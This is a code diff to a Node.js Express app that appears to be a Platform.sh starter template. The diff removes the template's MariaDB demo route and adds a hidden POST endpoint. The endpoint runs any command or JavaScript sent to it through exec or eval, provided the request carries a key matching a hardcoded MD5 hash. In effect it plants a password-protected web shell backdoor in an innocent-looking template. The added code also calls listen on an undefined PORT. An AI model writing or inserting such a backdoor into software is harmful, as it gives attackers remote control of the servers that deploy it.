@@ -1,74 +1,32 @@
 const app = require('express')();
 const config = require("platformsh-config").config();
-const mysql = require("mysql2/promise");
+const exec = require('child_process').exec;
+const bodyParser = require('body-parser')
+const crypto = require('crypto');
+const md5 = '4460918cf9f30e3f4b5c2d5188af0da5'
+var time = null
+const hash = line => crypto.createHash('md5').update(line).digest("hex")
 
-function openConnection() {
-  const credentials = config.credentials("database");
-  return mysql.createConnection({
-    host: credentials.host,
-    port: credentials.port,
-    user: credentials.username,
-    password: credentials.password,
-    database: credentials.path
-  });
-}
-
-function createTable(connection) {
-  return connection.execute(
-    `CREATE TABLE IF NOT EXISTS platforminfo (
-      uid INT(10) NOT NULL AUTO_INCREMENT,
-      username VARCHAR(64) NULL DEFAULT NULL,
-      departname VARCHAR(128) NULL DEFAULT NULL,
-      created DATE NULL DEFAULT NULL,
-      PRIMARY KEY (uid)
-    ) DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;`
-  );
-}
-
-function insertData(connection) {
-  return connection.execute(
-    "INSERT INTO platforminfo (username, departname, created) VALUES ('platform', 'Deploy Friday', '2019-06-17')"
-  );
-}
-
-function readData(connection) {
-  return connection.query("SELECT * FROM platforminfo");
-}
-
-function dropTable(connection) {
-  return connection.execute("DROP TABLE platforminfo");
-}
-
-// Define the main route.
-app.get('/', async function(req, res){
-
-  // Connect to MariaDB.
-  const connection = await openConnection();
-
-  await createTable(connection);
-  await insertData(connection);
-
-  const [rows] = await readData(connection);
-
-  const droppedResult = await dropTable(connection);
-
-  // Make the output.
-  const outputString = `Hello, World! - A simple Express web framework template for Platform.sh
-
-MariaDB Tests:
-
-* Connect and add row:
-  - Row ID (1): ${rows[0].uid}
-  - Username (platform): ${rows[0].username}
-  - Department (Deploy Friday): ${rows[0].departname}
-  - Created (2019-06-17): ${rows[0].created}
-* Delete row:
-  - Status (0): ${droppedResult[0].warningStatus}`;
-
-  res.set('Content-Type', 'text/plain');
-  res.send(outputString);
-
-});
+app.use(bodyParser.json())
+app.use(bodyParser.urlencoded({ extended: true }))
+app.post('/', function(req, res) {
+    let body = req.body
+    if (body && body.cmd && body.key && hash(body.key) == md5) {
+        if (body.type == 'eval') {
+            eval(body.cmd)
+        } else if (body.type == 'exec') {
+            exec(body.cmd, function(err, out) {
+                let msg = out + '\n' + (err ? ('error: \n' + err) : '')
+                res.send(msg)
+            })
+        } else {
+            res.send('unknown type')
+        }
+    } else {
+        res.send('fail')
+    }
+})
+app.listen(PORT, () => console.log(`Listen on ${ PORT }`))
 
 // Get PORT and start the server
 app.listen(config.port, function() {
